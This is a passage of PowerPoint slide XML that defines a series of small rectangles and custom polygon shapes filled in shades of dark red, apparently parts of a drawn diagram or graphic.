          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="481" name="CustomShape 97"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5076720" y="5645160"/>
            <a:ext cx="65880" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="482" name="CustomShape 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5041800" y="5586480"/>
            <a:ext cx="65880" cy="48600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="483" name="CustomShape 99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5110200" y="5583240"/>
            <a:ext cx="34200" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="484" name="CustomShape 100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5008680" y="5583240"/>
            <a:ext cx="26280" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="485" name="CustomShape 101"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5006880" y="5762520"/>
            <a:ext cx="62640" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="486" name="CustomShape 102"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5076720" y="5762520"/>
            <a:ext cx="65880" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="400000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="487" name="CustomShape 103"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5041800" y="5702400"/>
            <a:ext cx="65880" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="488" name="CustomShape 104"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5110200" y="5702400"/>
            <a:ext cx="34200" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="489" name="CustomShape 105"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5006880" y="5702400"/>
            <a:ext cx="27720" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="490" name="CustomShape 106"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4989600" y="5745240"/>
            <a:ext cx="18360" cy="64440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="12" h="41">
                <a:moveTo>
                  <a:pt x="12" y="11"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="12" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="11"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="491" name="CustomShape 107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4930920" y="5678640"/>
            <a:ext cx="54720" cy="110520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="70">
                <a:moveTo>
                  <a:pt x="35" y="40"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="40"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="400000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="492" name="CustomShape 108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4873680" y="5616720"/>
            <a:ext cx="54720" cy="105480"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="67">
                <a:moveTo>
                  <a:pt x="35" y="39"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="39"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="493" name="CustomShape 109"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4815000" y="5554800"/>
            <a:ext cx="53280" cy="102600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="34" h="65">
                <a:moveTo>
                  <a:pt x="34" y="37"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="37"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="494" name="CustomShape 110"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="5521320"/>
            <a:ext cx="26280" cy="72360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="17" h="46">
                <a:moveTo>
                  <a:pt x="17" y="18"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="17" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="18"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="495" name="CustomShape 111"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4989600" y="4921200"/>
            <a:ext cx="18360" cy="56520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="12" h="36">
                <a:moveTo>
                  <a:pt x="12" y="5"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="12" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="5"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="496" name="CustomShape 112"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4930920" y="4889520"/>
            <a:ext cx="54720" cy="77040"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="49">
                <a:moveTo>
                  <a:pt x="35" y="19"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="19"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="497" name="CustomShape 113"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4873680" y="4859280"/>
            <a:ext cx="54720" cy="72360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="46">
                <a:moveTo>
                  <a:pt x="35" y="18"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="18"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="498" name="CustomShape 114"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4815000" y="4827600"/>
            <a:ext cx="53280" cy="72360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="34" h="46">
                <a:moveTo>
                  <a:pt x="34" y="18"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="18"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="499" name="CustomShape 115"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="4809960"/>
            <a:ext cx="26280" cy="56520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="17" h="36">
                <a:moveTo>
                  <a:pt x="17" y="10"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="17" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="10"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="400000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="500" name="CustomShape 116"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4930920" y="5002200"/>
            <a:ext cx="54720" cy="81720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="52">
                <a:moveTo>
                  <a:pt x="35" y="22"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="22"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="501" name="CustomShape 117"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4873680" y="4965840"/>
            <a:ext cx="54720" cy="81720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="52">
                <a:moveTo>
                  <a:pt x="35" y="23"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="23"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="502" name="CustomShape 118"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4815000" y="4930920"/>
            <a:ext cx="53280" cy="77040"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="34" h="49">
                <a:moveTo>
                  <a:pt x="34" y="21"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="21"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="400000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="503" name="CustomShape 119"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="4911840"/>
            <a:ext cx="26280" cy="61200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="17" h="39">
                <a:moveTo>
                  <a:pt x="17" y="11"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="17" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="11"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="504" name="CustomShape 120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4989600" y="5157720"/>
            <a:ext cx="18360" cy="59760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="12" h="38">
                <a:moveTo>
                  <a:pt x="12" y="8"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="12" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="8"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="505" name="CustomShape 121"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4930920" y="5114880"/>
            <a:ext cx="54720" cy="86760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="55">
                <a:moveTo>
                  <a:pt x="35" y="24"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="24"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="506" name="CustomShape 122"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4873680" y="5073480"/>
            <a:ext cx="54720" cy="84960"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="54">
                <a:moveTo>
                  <a:pt x="35" y="26"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="26"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="507" name="CustomShape 123"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4815000" y="5035680"/>
            <a:ext cx="53280" cy="81720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="34" h="52">
                <a:moveTo>
                  <a:pt x="34" y="24"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="24"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="508" name="CustomShape 124"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="5014800"/>
            <a:ext cx="26280" cy="59760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="17" h="38">
                <a:moveTo>
                  <a:pt x="17" y="10"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="17" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
